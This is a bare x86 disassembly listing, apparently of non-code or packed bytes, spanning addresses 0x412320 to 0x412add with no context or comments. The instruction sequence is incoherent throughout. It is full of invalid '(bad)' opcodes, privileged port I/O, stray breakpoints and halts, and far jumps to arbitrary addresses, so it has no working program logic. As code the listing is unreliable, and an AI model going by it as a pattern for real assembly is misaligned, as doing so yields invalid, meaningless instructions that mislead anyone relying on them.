  412320:	cmp    cl,bh
  412322:	ret    
  412323:	retf   0xf44e
  412326:	sub    bl,BYTE PTR [edx-0x78]
  412329:	mov    eax,ds:0x6be75c99
  41232e:	ficom  DWORD PTR [ebp-0x67]
  412331:	daa    
  412332:	cmp    esp,esi
  412334:	jge    0x4122e2
  412336:	aas    
  412337:	sbb    edx,DWORD PTR [edi-0x3d]
  41233a:	xchg   esp,eax
  41233b:	out    0xc9,al
  41233d:	push   cs
  41233e:	dec    eax
  41233f:	mov    ah,0x12
  412341:	push   0xfec1c206
  412346:	and    edi,DWORD PTR [eax+0x73]
  412349:	lahf   
  41234a:	outs   dx,DWORD PTR ds:[esi]
  41234b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41234c:	mov    edx,0x8d387861
  412351:	push   edi
  412352:	arpl   cx,di
  412354:	cmp    esp,DWORD PTR [ebx]
  412356:	outs   dx,BYTE PTR ds:[esi]
  412357:	hlt    
  412358:	loope  0x412311
  41235a:	xchg   ah,cl
  41235c:	icebp  
  41235d:	mov    eax,0x2af1bda1
  412362:	push   ss
  412363:	jp     0x4123d8
  412365:	imul   edx,DWORD PTR [ebx+0x4c90359a],0xffffffb2
  41236c:	sbb    BYTE PTR [edx-0x37],bl
  41236f:	loope  0x41235f
  412371:	loopne 0x4123d5
  412373:	dec    ebx
  412374:	jmp    0xd0bbde4
  412379:	and    al,BYTE PTR [edx-0x36]
  41237c:	jne    0x41238d
  41237e:	and    eax,0xeb6e77c7
  412383:	aad    0xa1
  412385:	push   edx
  412386:	lea    ecx,[ebx+0x15]
  412389:	scas   al,BYTE PTR es:[edi]
  41238a:	sbb    cl,dl
  41238c:	cmp    DWORD PTR [ebx+0x48],esp
  41238f:	add    esp,edx
  412391:	jb     0x412338
  412393:	test   BYTE PTR [ebx],bl
  412395:	nop
  412396:	xchg   edx,eax
  412397:	out    0x63,eax
  412399:	xchg   BYTE PTR [esi],dh
  41239b:	mov    DWORD PTR [ebx+0x5b],edx
  41239e:	neg    BYTE PTR [ebx+0x65f0e736]
  4123a4:	test   edi,edi
  4123a6:	in     eax,dx
  4123a7:	adc    DWORD PTR [ebp-0x18],edx
  4123aa:	xchg   bh,ch
  4123ac:	dec    ebx
  4123ad:	xchg   edx,eax
  4123ae:	in     eax,0x51
  4123b0:	cdq    
  4123b1:	pop    esp
  4123b2:	loop   0x412379
  4123b4:	je     0x412350
  4123b6:	aaa    
  4123b7:	jns    0x412436
  4123b9:	enter  0x86b5,0x2f
  4123bd:	test   BYTE PTR ds:0xaf1314df,ch
  4123c3:	int3   
  4123c4:	inc    ebx
  4123c5:	call   0x12fc:0x2e943843
  4123cc:	cwde   
  4123cd:	xor    ah,dh
  4123cf:	enter  0x19f7,0xf2
  4123d3:	push   esi
  4123d4:	mov    edx,0xed749d08
  4123d9:	mov    dl,0x5d
  4123db:	add    al,0xe3
  4123de:	add    edx,DWORD PTR [edi]
  4123e0:	cmp    ecx,DWORD PTR [esi]
  4123e2:	pop    ebx
  4123e3:	pop    eax
  4123e4:	std    
  4123e5:	cli    
  4123e6:	or     ah,BYTE PTR [ebx+0x4e]
  4123e9:	into   
  4123ea:	jno    0x412375
  4123ec:	mov    bl,0xd
  4123ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123ef:	mov    ds:0xb7f129f7,al
  4123f4:	cdq    
  4123f5:	sbb    al,0x53
  4123f7:	xchg   DWORD PTR [edx+0x2f],edi
  4123fa:	popa   
  4123fb:	jb     0x412407
  4123fd:	push   eax
  4123fe:	fldcw  WORD PTR [ebx]
  412400:	fadd   st,st(7)
  412402:	ret    
  412403:	addr16 add al,0xd4
  412406:	xor    dl,BYTE PTR [edi-0x4f11c344]
  41240c:	fnsave [eax]
  41240e:	in     al,0x5f
  412410:	or     BYTE PTR [eax+eiz*4],dh
  412413:	mov    ecx,0x901340c3
  412418:	data16 fs jo 0x4123ef
  41241c:	lock ret 0x117
  412420:	int3   
  412421:	out    dx,al
  412422:	sar    BYTE PTR [ebx-0x29],1
  412425:	mov    ch,0x96
  412427:	jns    0x412419
  412429:	iret   
  41242a:	pop    edx
  41242b:	xor    al,0x88
  41242d:	cdq    
  41242e:	adc    ecx,eax
  412430:	sub    BYTE PTR [ebx],bh
  412432:	xchg   DWORD PTR [eax],ecx
  412434:	test   BYTE PTR [ebx+0x161c7708],dh
  41243a:	sar    BYTE PTR [edx-0x441d5d7d],0xe8
  412441:	sahf   
  412442:	gs (bad) 
  412444:	icebp  
  412445:	ret    0xb795
  412448:	aam    0x31
  41244a:	int3   
  41244b:	inc    esp
  41244c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41244d:	or     ch,dl
  41244f:	cmp    ecx,DWORD PTR [edi+0x71]
  412452:	ins    BYTE PTR es:[edi],dx
  412453:	jmp    0x4124d4
  412455:	push   ss
  412456:	xchg   esp,eax
  412457:	in     eax,dx
  412458:	pop    ds
  412459:	in     al,dx
  41245a:	es pop ecx
  41245c:	popa   
  41245d:	pop    edi
  41245e:	test   eax,0xda41a0ed
  412463:	loopne 0x412453
  412465:	lock sub BYTE PTR [eax],0x5d
  412469:	cmp    ch,dh
  41246b:	and    al,0x4a
  41246d:	or     al,0x85
  41246f:	mov    dl,0x28
  412471:	jns    0x4124e1
  412473:	pop    ebp
  412474:	jbe    0x41245b
  412476:	(bad)  
  412477:	mov    ecx,0xe1cb0df2
  41247c:	cmp    eax,DWORD PTR [ecx-0x20fc1191]
  412482:	stc    
  412483:	jmp    0x7a0f17d9
  412488:	xor    eax,0x40ab8816
  41248d:	pop    ebx
  41248e:	fsubr  st(1),st
  412490:	xchg   edx,eax
  412491:	and    dl,cl
  412493:	das    
  412494:	mov    eax,0xa912bb8d
  412499:	lahf   
  41249a:	test   ebx,eax
  41249c:	dec    BYTE PTR [ecx]
  41249e:	push   eax
  41249f:	sbb    al,0x59
  4124a1:	jl     0x4124e1
  4124a3:	sub    dl,dl
  4124a5:	add    ecx,DWORD PTR [ecx+edx*8+0xd]
  4124a9:	(bad)  [ebx+ecx*2+0x1a186114]
  4124b0:	data16 sub al,0x6b
  4124b3:	jl     0x4124a5
  4124b5:	call   0x6103:0xc60f9e86
  4124bc:	int    0x66
  4124be:	std    
  4124bf:	int    0x15
  4124c1:	mov    ds:0xa0cfaae7,eax
  4124c6:	add    eax,0xd2ecd383
  4124cb:	add    esp,DWORD PTR ds:0x9fd309c4
  4124d1:	lea    edx,[eax+eiz*1-0x4136d49e]
  4124d8:	jmp    0xd92e5c20
  4124dd:	and    eax,0x2493b6fa
  4124e2:	and    bh,BYTE PTR [edx+esi*2]
  4124e5:	jmp    0xd4a5e3c6
  4124ea:	inc    ebp
  4124eb:	xor    dh,BYTE PTR [eax+eiz*1]
  4124ee:	inc    ecx
  4124ef:	jg     0x41252b
  4124f1:	mov    edx,0x5a5145f7
  4124f6:	push   ebp
  4124f7:	cdq    
  4124f8:	cmp    ebx,esi
  4124fa:	aad    0x89
  4124fc:	dec    ebx
  4124fd:	or     cl,BYTE PTR [esi]
  4124ff:	dec    ecx
  412500:	ins    BYTE PTR es:[edi],dx
  412501:	jecxz  0x4124d7
  412503:	mov    edx,ss
  412505:	push   ebx
  412506:	in     al,0x59
  412508:	aam    0x7b
  41250a:	mov    ds:0xc66cd3fe,al
  41250f:	push   esp
  412510:	shl    BYTE PTR [ebx+0x63],0xc
  412514:	or     DWORD PTR [esi+0x46],esi
  412517:	(bad)  
  412518:	rcl    BYTE PTR [ebx-0x2e],cl
  41251b:	das    
  41251c:	ret    0x58b
  41251f:	icebp  
  412520:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412521:	das    
  412522:	add    eax,0x4ce542e0
  412527:	pop    ebp
  412528:	pop    ds
  412529:	sub    eax,0xfb7e91e4
  41252e:	pop    edi
  41252f:	push   0xffffff85
  412531:	jmp    0x5048:0x7651c843
  412538:	loopne 0x4124e7
  41253a:	aaa    
  41253b:	adc    edx,DWORD PTR [esi-0x48]
  41253e:	pushf  
  41253f:	sub    esi,DWORD PTR [ebp-0xa]
  412542:	or     ch,BYTE PTR [ebp-0x67]
  412545:	sahf   
  412546:	hlt    
  412547:	sub    eax,0x396d5315
  41254c:	(bad)  
  41254e:	dec    eax
  41254f:	daa    
  412550:	cs repnz int 0x93
  412554:	jnp    0x41254a
  412556:	add    eax,0xb35ab4ee
  41255b:	sbb    ch,BYTE PTR [esi+0x19beaf54]
  412561:	mov    eax,ds:0xef2c19a6
  412566:	or     al,0xa4
  412568:	out    0x7e,eax
  41256a:	xchg   ebp,eax
  41256b:	mov    al,0x19
  41256d:	dec    ebp
  41256e:	inc    edi
  41256f:	gs jmp 0xf80c:0xf6b5358f
  412577:	push   esp
  412578:	pop    ebp
  412579:	(bad)  
  41257a:	mov    esi,0x4e38ce08
  41257f:	sbb    esi,DWORD PTR [edi+0x38]
  412582:	mov    ch,0xa4
  412584:	push   0x3f
  412586:	dec    edx
  412587:	pop    ss
  412588:	sbb    cl,BYTE PTR [ebp-0x2f95fa6b]
  41258e:	inc    edx
  41258f:	in     al,dx
  412590:	(bad)  
  412591:	fnstcw WORD PTR [ebp+ebp*4-0x67857256]
  412598:	mov    esi,0xff0e47b4
  41259d:	mov    esi,0x6ec986fa
  4125a2:	aam    0xbf
  4125a4:	imul   esi,ebx,0x2e5c945b
  4125aa:	aad    0xc0
  4125ac:	add    eax,0x8e8542de
  4125b1:	loope  0x4125fb
  4125b3:	das    
  4125b4:	adc    al,BYTE PTR [eax+0x23]
  4125b7:	iret   
  4125b8:	inc    ebx
  4125b9:	push   0x641c65f8
  4125be:	out    0xf3,eax
  4125c0:	pushf  
  4125c1:	adc    dh,BYTE PTR [edx]
  4125c3:	add    edi,esp
  4125c5:	lock stc 
  4125c7:	or     ecx,edx
  4125c9:	push   0x5e
  4125cb:	imul   edi,DWORD PTR [ecx],0xffffffa2
  4125ce:	inc    ecx
  4125cf:	test   eax,0xc1baadd0
  4125d4:	pop    ds
  4125d5:	jae    0x4125d3
  4125d7:	push   ds
  4125d8:	pop    ebp
  4125d9:	cdq    
  4125da:	call   0xc1f49a44
  4125df:	fadd   QWORD PTR [ebp-0x72a6dc37]
  4125e5:	popf   
  4125e6:	pusha  
  4125e7:	cmc    
  4125e8:	stos   DWORD PTR es:[edi],eax
  4125e9:	dec    ecx
  4125ea:	push   edi
  4125eb:	lods   al,BYTE PTR ds:[esi]
  4125ec:	push   cs
  4125ed:	pop    ss
  4125ee:	sbb    ah,BYTE PTR [edx]
  4125f0:	out    dx,eax
  4125f1:	sbb    ebx,DWORD PTR [edx]
  4125f3:	jg     0x412599
  4125f5:	xchg   edx,eax
  4125f6:	hlt    
  4125f7:	xlat   BYTE PTR ds:[ebx]
  4125f8:	rcr    BYTE PTR [eax-0x85e7d02],0x8
  4125ff:	test   BYTE PTR [eax],cl
  412601:	pop    edx
  412602:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412603:	mov    esp,0xc8559783
  412608:	int    0xe5
  41260a:	addr16 and edi,eax
  41260d:	fcomp  QWORD PTR [ecx-0x23]
  412610:	mov    bh,0x2
  412612:	xor    edi,DWORD PTR [ebx+0x4b]
  412615:	xor    eax,0x83f5bfa
  41261a:	mov    edx,0x486e9060
  41261f:	mov    cl,0x7d
  412621:	(bad)  
  412622:	adc    al,ah
  412624:	mov    BYTE PTR [edx],ch
  412626:	int    0x94
  412628:	neg    bh
  41262a:	add    ecx,DWORD PTR [edx-0x6b]
  41262d:	bound  eax,QWORD PTR [ecx-0x64485483]
  412633:	and    al,0xa0
  412635:	pop    esp
  412636:	in     eax,dx
  412637:	jmp    0x60060cee
  41263c:	outs   dx,DWORD PTR ds:[esi]
  41263d:	dec    esi
  41263e:	mov    ds:0x20ea338e,eax
  412643:	arpl   WORD PTR [ebx-0x4c],si
  412646:	mov    ds:0x33197d69,al
  41264b:	in     al,dx
  41264c:	lds    ebx,FWORD PTR [edi-0x60e20ec3]
  412652:	sbb    edx,DWORD PTR [edi+esi*8+0x24]
  412656:	xchg   esp,eax
  412657:	xchg   ebx,eax
  412658:	sub    ebx,DWORD PTR [edx]
  41265a:	out    dx,al
  41265b:	mov    ch,0x69
  41265d:	or     DWORD PTR [esi-0xe],ecx
  412660:	inc    edi
  412661:	inc    edi
  412662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412663:	jo     0x4125ee
  412665:	jo     0x412611
  412667:	mov    ebx,0x30db61c0
  41266c:	arpl   ax,si
  41266e:	mov    al,ds:0xb6d6d3bf
  412673:	gs pop eax
  412675:	xor    BYTE PTR [esi+0x3c],cl
  412678:	mov    ds:0x1caa6e9c,eax
  41267d:	push   0xffffff88
  41267f:	jg     0x41265c
  412681:	imul   edx,DWORD PTR ds:0x4f91dc55,0xeda03575
  41268b:	xchg   ebp,eax
  41268c:	mov    al,ds:0xd760c3c7
  412691:	es stos BYTE PTR es:[edi],al
  412693:	pop    edx
  412694:	(bad)  
  412695:	das    
  412696:	mov    ds:0xb57e48f,eax
  41269b:	adc    edx,DWORD PTR [edx]
  41269d:	ja     0x4126ac
  41269f:	add    ebp,DWORD PTR [ecx]
  4126a1:	jae    0x41264d
  4126a3:	test   eax,0x690bf7b6
  4126a8:	xchg   DWORD PTR ds:0xd341943e,edi
  4126ae:	and    al,0x75
  4126b0:	aas    
  4126b1:	fs mov dh,0x50
  4126b4:	add    eax,0x1d22fd96
  4126b9:	js     0x412651
  4126bb:	add    DWORD PTR [ebx+0x48156c9a],edi
  4126c1:	hlt    
  4126c2:	push   ebx
  4126c3:	popa   
  4126c4:	jp     0x41265f
  4126c6:	and    bl,bh
  4126c8:	lods   eax,DWORD PTR ds:[esi]
  4126c9:	js     0x41271d
  4126cb:	and    eax,0x8b4ff5d6
  4126d0:	(bad)  
  4126d1:	adc    al,0xf6
  4126d3:	cmp    DWORD PTR [esi],edx
  4126d5:	sub    al,0x7
  4126d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126d8:	int3   
  4126d9:	xor    ah,BYTE PTR [eax+0x39867026]
  4126df:	mov    edi,0xebc38397
  4126e4:	dec    edi
  4126e5:	mov    cl,0xdd
  4126e7:	xchg   esi,eax
  4126e8:	mov    dl,0x4b
  4126ea:	cmc    
  4126eb:	stos   BYTE PTR es:[edi],al
  4126ec:	xchg   edi,eax
  4126ed:	loopne 0x4126d2
  4126ef:	addr16 test ah,dh
  4126f2:	out    dx,eax
  4126f3:	repnz fwait
  4126f5:	add    ecx,DWORD PTR [ebx]
  4126f7:	add    DWORD PTR [edx-0x31],esi
  4126fa:	div    DWORD PTR [eax+eiz*4+0x642f7b2d]
  412701:	push   0xbf005336
  412706:	sbb    DWORD PTR [ecx],esi
  412708:	add    DWORD PTR [eax-0x2d],ecx
  41270b:	ror    BYTE PTR [ebx],1
  41270d:	cmc    
  41270e:	inc    ecx
  41270f:	int3   
  412710:	or     DWORD PTR [ebx],edi
  412712:	add    DWORD PTR [ecx+0x44],esp
  412715:	lods   al,BYTE PTR ds:[esi]
  412716:	ret    
  412717:	sar    DWORD PTR [esi+esi*1-0x37],cl
  41271b:	xor    BYTE PTR [esi],dl
  41271d:	(bad)  
  41271f:	add    DWORD PTR [eax-0x686b34d0],eax
  412725:	sbb    al,0x98
  412727:	xor    al,0xb0
  412729:	adc    BYTE PTR [edi],bl
  41272b:	push   es
  41272c:	das    
  41272d:	sbb    al,BYTE PTR [edi]
  41272f:	xchg   edx,eax
  412730:	shl    BYTE PTR [eax-0x5c],cl
  412733:	sbb    BYTE PTR [ecx],cl
  412735:	lahf   
  412736:	xchg   esi,eax
  412737:	sub    al,0x2e
  412739:	stc    
  41273a:	or     BYTE PTR [esp+edx*1-0x16450e62],0x8d
  412742:	push   ebx
  412743:	adc    al,0x2e
  412745:	test   BYTE PTR [esp+0x3a],cl
  412749:	ffree  st(5)
  41274b:	lea    ecx,[edx+0xc]
  41274e:	mov    ds:0xfba83258,al
  412753:	push   esi
  412754:	inc    ebx
  412755:	ror    DWORD PTR [edx-0x6],0x9f
  412759:	sti    
  41275a:	add    eax,0xd29cd9d7
  41275f:	xor    DWORD PTR [edi+0x5cc3c7c0],edi
  412765:	cli    
  412766:	shl    BYTE PTR [edx-0x45],cl
  412769:	std    
  41276a:	ins    DWORD PTR es:[edi],dx
  41276b:	xchg   ecx,eax
  41276c:	xchg   ebp,eax
  41276d:	or     ebx,eax
  41276f:	mov    al,0xd0
  412771:	es and eax,0x67d3cf74
  412777:	or     ch,BYTE PTR [edx+eax*2]
  41277a:	stos   BYTE PTR es:[edi],al
  41277b:	nop
  41277c:	fwait
  41277d:	aam    0xb2
  41277f:	jmp    0x412742
  412781:	jbe    0x41273a
  412783:	adc    dl,BYTE PTR [ebp+0x3c]
  412786:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412788:	loope  0x412774
  41278a:	or     eax,0xd59c7d5
  41278f:	inc    esp
  412790:	gs inc ebp
  412792:	call   0xa932ceb6
  412797:	push   edi
  412798:	aaa    
  412799:	dec    edi
  41279a:	xor    esi,edi
  41279c:	lods   eax,DWORD PTR fs:[esi]
  41279e:	aaa    
  41279f:	out    0xa7,al
  4127a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127a2:	xor    bh,BYTE PTR [eax]
  4127a4:	mov    esp,0x1e6d8203
  4127a9:	sar    BYTE PTR [ebx+0xd],1
  4127ac:	xchg   edx,eax
  4127ad:	add    ch,BYTE PTR [ebx+0x5d390984]
  4127b3:	lahf   
  4127b4:	fwait
  4127b5:	addr16 pop eax
  4127b7:	mov    cl,0x11
  4127b9:	(bad)  
  4127bb:	fcmovu st,st(4)
  4127bd:	rcl    DWORD PTR [ecx+0x2def32f9],1
  4127c3:	dec    edx
  4127c4:	cmc    
  4127c5:	sahf   
  4127c6:	push   ecx
  4127c7:	push   ss
  4127c8:	jnp    0x4127ab
  4127ca:	jmp    0xe3e8:0xa4d35325
  4127d1:	loope  0x4127e4
  4127d3:	push   esp
  4127d4:	fild   QWORD PTR [ecx-0x26b975ef]
  4127da:	cmp    DWORD PTR [esi-0x64],0xe8ca3196
  4127e1:	repz adc BYTE PTR [edi-0x2b048a16],cl
  4127e8:	sub    eax,0x4bf305b0
  4127ed:	dec    ebx
  4127ee:	xchg   DWORD PTR [edi+0x40],ecx
  4127f1:	sbb    edi,ecx
  4127f3:	ficomp WORD PTR [ebp+0x65d28a21]
  4127f9:	pushf  
  4127fa:	gs push es
  4127fc:	lahf   
  4127fd:	and    bh,BYTE PTR [eax-0x6d4764da]
  412803:	test   DWORD PTR [ecx+0x2a],ebx
  412806:	aam    0x40
  412808:	cs jo  0x4127b7
  41280b:	push   ebp
  41280c:	dec    ebx
  41280d:	popf   
  41280e:	outs   dx,DWORD PTR ds:[esi]
  41280f:	push   edx
  412810:	div    ch
  412812:	xor    al,0xed
  412814:	adc    bh,dl
  412816:	shr    ebx,cl
  412818:	ja     0x412856
  41281a:	and    esp,DWORD PTR [edx]
  41281c:	jle    0x41281f
  41281e:	mov    ebp,0x9dc4a8f8
  412823:	jle    0x4127f3
  412825:	mov    ah,0x45
  412827:	and    DWORD PTR [edi],ecx
  412829:	int    0x95
  41282b:	bound  eax,QWORD PTR [edi]
  41282d:	imul   esp,DWORD PTR [edx+0x30c493e0],0x11
  412834:	scas   al,BYTE PTR es:[edi]
  412835:	inc    ebp
  412836:	daa    
  412837:	pop    edx
  412838:	dec    edx
  412839:	aam    0x53
  41283b:	lock mov bl,0xb9
  41283e:	xchg   ebp,eax
  41283f:	mov    ebx,0xe3840c81
  412844:	test   esi,ebp
  412846:	out    0xb6,al
  412848:	cmc    
  412849:	in     al,0xf6
  41284b:	fidivr WORD PTR [edx+edi*1+0x74]
  41284f:	test   eax,0x758cdfa
  412854:	mov    edx,0x539bf885
  412859:	dec    ecx
  41285a:	pop    ebp
  41285b:	push   ds
  41285c:	xlat   BYTE PTR ds:[ebx]
  41285d:	clc    
  41285e:	dec    eax
  41285f:	loope  0x4127e9
  412861:	lahf   
  412862:	cmp    eax,esi
  412864:	fnsave [eax]
  412866:	pop    ebp
  412867:	mov    al,0xbc
  412869:	push   ebx
  41286a:	fisttp QWORD PTR [ecx]
  41286c:	mov    ebp,0x574089b4
  412871:	and    edi,ebp
  412873:	stos   DWORD PTR es:[edi],eax
  412874:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412875:	adc    bl,BYTE PTR [edx+0x56]
  412878:	xchg   ebx,eax
  412879:	cwde   
  41287a:	lds    ebx,FWORD PTR [ebx+esi*8+0x41]
  41287e:	popa   
  41287f:	or     BYTE PTR [edi],0x23
  412882:	cmc    
  412883:	cwde   
  412884:	es and al,0x9f
  412887:	or     ch,cl
  412889:	sub    eax,0x261f7b96
  41288e:	push   eax
  41288f:	hlt    
  412890:	mov    eax,0x32383e9f
  412895:	retf   
  412896:	sbb    eax,0xce5b6688
  41289b:	add    ah,dh
  41289d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41289e:	xor    esi,DWORD PTR [ecx-0x28ecf4ce]
  4128a4:	cmc    
  4128a5:	loop   0x412924
  4128a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128a8:	shr    ah,cl
  4128aa:	xchg   ebx,eax
  4128ab:	bswap  edx
  4128ad:	(bad)  
  4128af:	shl    BYTE PTR [edx+edx*2-0x5d],0xd4
  4128b4:	or     ebx,ebx
  4128b6:	out    dx,eax
  4128b7:	cmp    al,0xe2
  4128b9:	adc    bh,BYTE PTR ds:0x25bf732f
  4128bf:	pop    esp
  4128c0:	icebp  
  4128c1:	fcomp  QWORD PTR [esi-0x1f]
  4128c4:	inc    di
  4128c6:	cmp    eax,0xfe973892
  4128cb:	jl     0x4128d2
  4128cd:	dec    edi
  4128ce:	mov    esi,DWORD PTR cs:[edx]
  4128d1:	pop    ebp
  4128d2:	outs   dx,DWORD PTR ds:[esi]
  4128d3:	adc    eax,0x8eeceba5
  4128d8:	popf   
  4128d9:	ds jg  0x412923
  4128dc:	mov    esi,0x9c565b09
  4128e1:	jg     0x412948
  4128e3:	adc    esi,ebp
  4128e5:	xor    ebx,DWORD PTR [esp+edi*4-0x68]
  4128e9:	das    
  4128ea:	push   ebp
  4128eb:	data16 or al,0x1c
  4128ee:	aaa    
  4128ef:	dec    ebx
  4128f0:	shl    BYTE PTR [esi-0x55ea43b0],1
  4128f6:	jle    0x41290e
  4128f8:	or     BYTE PTR [esi-0x1a],bl
  4128fb:	(bad)  
  4128fc:	popa   
  4128fd:	call   0xedb28115
  412902:	loop   0x41292b
  412904:	dec    ecx
  412905:	scas   al,BYTE PTR es:[edi]
  412906:	jo     0x412941
  412908:	enter  0xeb9c,0xdb
  41290c:	shl    BYTE PTR [edx-0xe805350],cl
  412912:	inc    DWORD PTR [edi]
  412914:	dec    ebx
  412915:	ins    BYTE PTR es:[edi],dx
  412916:	loopne 0x4128f6
  412918:	sub    DWORD PTR [ebp-0x6274326],ecx
  41291e:	mov    eax,0x8b702df
  412923:	sub    DWORD PTR [edx+0x65],ecx
  412926:	or     eax,0x401de563
  41292b:	or     DWORD PTR [ebp-0x58aee238],ebx
  412931:	cmc    
  412932:	or     eax,0x5386f47c
  412937:	ja     0x412959
  412939:	and    edi,DWORD PTR [edx+esi*8+0x30908c83]
  412940:	(bad)  
  412941:	sub    WORD PTR [edx+0x1d],dx
  412945:	loop   0x412906
  412947:	bound  edi,QWORD PTR [ebx]
  412949:	cmp    BYTE PTR ds:0xdd58a418,al
  41294f:	stc    
  412950:	push   ebx
  412951:	ins    BYTE PTR es:[edi],dx
  412952:	scas   al,BYTE PTR es:[edi]
  412953:	out    0x45,al
  412955:	rcr    BYTE PTR cs:[edx-0x47],cl
  412959:	sub    esi,DWORD PTR [esi]
  41295b:	push   esi
  41295c:	daa    
  41295d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41295e:	dec    ecx
  41295f:	add    cl,BYTE PTR [esi]
  412961:	not    DWORD PTR [edi-0x1d]
  412964:	cmp    eax,0xa0d2a26f
  412969:	jno    0x41291d
  41296b:	and    DWORD PTR [esi+0x361b47d8],ebp
  412971:	data16 or BYTE PTR [ebp-0x3],cl
  412975:	test   DWORD PTR [edx+0xe43d91b],esp
  41297b:	stos   DWORD PTR es:[edi],eax
  41297c:	ins    DWORD PTR es:[edi],dx
  41297d:	cmp    ebp,DWORD PTR [ebx+0x6bbfedd9]
  412983:	ror    BYTE PTR [edx+edx*8+0x6edc0674],1
  41298a:	adc    eax,edx
  41298c:	adc    eax,0x90b28efc
  412991:	jge    0x4129e5
  412993:	call   DWORD PTR [edx-0x196a0c13]
  412999:	in     eax,dx
  41299a:	or     DWORD PTR [eax+edx*4],0xb0e6535
  4129a1:	mov    esi,0x12ffde9c
  4129a6:	dec    ecx
  4129a7:	js     0x412938
  4129a9:	mov    ah,0xb6
  4129ab:	push   ebx
  4129ac:	mov    esi,0xe1646673
  4129b1:	in     al,0xaf
  4129b3:	mov    al,ds:0x90a69a7f
  4129b8:	or     ah,0xc2
  4129bb:	in     eax,0xde
  4129bd:	ins    BYTE PTR es:[edi],dx
  4129be:	mov    dl,0x24
  4129c0:	lods   al,BYTE PTR ds:[esi]
  4129c1:	sbb    eax,0xdbe4c387
  4129c6:	mov    ebp,0xf968cef3
  4129cb:	or     al,0x15
  4129cd:	out    dx,eax
  4129ce:	int3   
  4129cf:	fnstenv [esi-0x36]
  4129d2:	mov    dl,0x9c
  4129d4:	push   ebp
  4129d5:	and    BYTE PTR ds:0x120757c3,dl
  4129db:	sbb    ebx,DWORD PTR [edi-0x5c]
  4129de:	das    
  4129df:	loopne 0x412a33
  4129e1:	fwait
  4129e2:	in     eax,dx
  4129e3:	int3   
  4129e4:	lock adc BYTE PTR [esi-0x63],0x7d
  4129e9:	cmp    al,0x2e
  4129eb:	div    DWORD PTR ds:0x17b320bc
  4129f1:	dec    eax
  4129f2:	jecxz  0x41299a
  4129f4:	push   ss
  4129f5:	mov    ds:0x9df45d00,eax
  4129fa:	aad    0xc7
  4129fc:	and    al,0x51
  4129fe:	test   eax,0xc35c7a8d
  412a03:	jb     0x4129c6
  412a05:	push   ss
  412a06:	push   edx
  412a07:	stos   BYTE PTR es:[edi],al
  412a08:	test   al,0x3e
  412a0a:	cli    
  412a0b:	(bad)  
  412a0d:	loope  0x412a51
  412a0f:	mov    dh,0x76
  412a11:	xchg   ebx,eax
  412a12:	pop    esp
  412a13:	mov    ebp,0x4e9902cf
  412a18:	and    BYTE PTR [esi-0x6f],0x61
  412a1c:	jge    0x4129bf
  412a1e:	cld    
  412a1f:	add    al,0xc9
  412a21:	rcr    DWORD PTR [esi],1
  412a23:	lea    edi,[edi+0xd89a86c]
  412a29:	pop    edx
  412a2a:	cs push ecx
  412a2c:	or     ebx,DWORD PTR [esi]
  412a2e:	or     ebp,0xaac460df
  412a34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a35:	mov    eax,ds:0xefa2845e
  412a3a:	mov    ebx,0x8bbf2efb
  412a3f:	mov    ch,0xe7
  412a41:	mov    WORD PTR [ecx-0x33],fs
  412a44:	ret    
  412a45:	inc    ebx
  412a46:	icebp  
  412a47:	aam    0x3b
  412a49:	cs out dx,al
  412a4b:	xchg   ecx,eax
  412a4c:	xchg   BYTE PTR [edx+esi*1],dh
  412a4f:	mov    eax,DWORD PTR [ebx-0x46]
  412a52:	pop    ds
  412a53:	das    
  412a54:	arpl   WORD PTR [edx-0x1ab852ce],di
  412a5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a5b:	jae    0x4129ef
  412a5d:	inc    esp
  412a5e:	jo     0x4129e5
  412a60:	or     al,0xe
  412a62:	clc    
  412a63:	cs jle 0x412a4a
  412a66:	scas   al,BYTE PTR es:[edi]
  412a67:	leave  
  412a68:	fld    QWORD PTR [edx+ebx*2-0x1a]
  412a6c:	aas    
  412a6d:	(bad)  
  412a6e:	out    0x9b,al
  412a70:	fs or  dl,bl
  412a73:	shr    BYTE PTR [eax-0x4456030a],1
  412a79:	cwde   
  412a7a:	dec    esp
  412a7b:	popf   
  412a7c:	xchg   DWORD PTR [esi],ebx
  412a7e:	jae    0x412a89
  412a80:	jge    0x412ab9
  412a82:	in     al,dx
  412a83:	retf   0xd5ac
  412a86:	sbb    BYTE PTR [eax],dl
  412a88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a89:	jmp    0x9c1bcf4
  412a8e:	mov    al,ds:0xe3897469
  412a93:	cmp    eax,0xe901aa52
  412a98:	adc    al,BYTE PTR [esi+0x730dee7b]
  412a9e:	jg     0x412ae7
  412aa0:	inc    edx
  412aa1:	add    bh,BYTE PTR [edi+0xf123f9d]
  412aa7:	loope  0x412b24
  412aa9:	shl    DWORD PTR [edx+ebx*1],cl
  412aac:	fmul   st,st(3)
  412aae:	(bad)  
  412aaf:	leave  
  412ab0:	test   al,0x4f
  412ab2:	(bad)  
  412ab3:	push   esp
  412ab4:	stos   DWORD PTR es:[edi],eax
  412ab5:	cli    
  412ab6:	mov    bl,0x54
  412ab8:	in     eax,0x9b
  412aba:	jle    0x412ae1
  412abc:	mov    DWORD PTR [edx-0x3e],edx
  412abf:	ret    0xc670
  412ac2:	retf   0x6ce1
  412ac5:	or     BYTE PTR [edx-0x76],bl
  412ac8:	sbb    al,0xee
  412aca:	ins    DWORD PTR es:[edi],dx
  412acb:	mov    al,ds:0x775f36ea
  412ad0:	jmp    0xb7b442c6
  412ad5:	popa   
  412ad6:	arpl   WORD PTR [esp+eiz*8],bp
  412ad9:	mov    bl,0xbe
  412adb:	in     eax,0x1d
  412add:	pushf  
